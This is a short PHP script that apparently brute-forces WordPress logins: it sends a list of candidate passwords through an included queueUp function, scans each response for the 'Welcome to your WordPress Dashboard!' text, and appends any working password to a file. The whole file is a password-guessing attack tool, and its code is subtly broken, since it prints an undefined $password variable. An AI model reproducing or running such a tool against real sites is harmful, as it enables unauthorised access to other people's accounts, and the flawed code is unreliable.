<?php
require 'queueUp.php';

$array_of_passwords = ['one', 'two', 'three', 'four', 'five', 'password01'];

$answer = queueUp($array_of_passwords);

// print_r($answer);

$needle = "Welcome to your WordPress Dashboard!";

foreach($answer as $piece){
 

    //Search the resultFromCurl content for the needle. It will be NOT false when it finds something (returned as an int)
    $checker = strpos($piece, $needle);

    if($checker){
        file_put_contents("passwordsThatWorked.txt", $password, FILE_APPEND);
        echo "It worked!! The password is $password \n";
        echo "Exiting.. \n";
        exit();
    }
    
}
